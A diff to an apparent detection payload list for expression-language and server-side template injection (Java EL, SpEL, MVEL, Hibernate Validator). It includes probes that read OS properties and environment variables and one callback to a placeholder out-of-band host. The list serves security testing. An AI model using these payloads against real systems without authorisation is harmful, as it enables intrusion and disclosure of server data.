@@ -2,7 +2,7 @@
 # Evaluator-level probes. Start with arithmetic; use property reads or DNS callbacks for confirmation.
 
 # Generic arithmetic detection across delimiters
-#{7*7}
+#{6*7}
 %{7*7}
 ${7*'7'}
 #{7*'7'}
@@ -32,7 +32,7 @@ ${"".getClass().forName("java.lang.System").getMethod("getProperty","".getClass(
 ${request.getClass().getName()}
 
 # Spring Expression Language (SpEL)
-#{7*7}
+#{7*7*1}
 T(java.lang.System).getProperty('os.name')
 T(java.lang.System).getProperty('java.version')
 T(java.lang.System).getenv('PATH')
@@ -98,7 +98,7 @@ new java.net.URL('http://oast.example.test/mvel').openStream()
 
 # Hibernate Validator / Bean Validation message interpolation (use in a field that appears in a validation error message)
 ${'a'+'b'}
-#{7*7}
+#{49*1}
 ${java.lang.System.getProperty('os.name')}
 $\A{7*7}
 
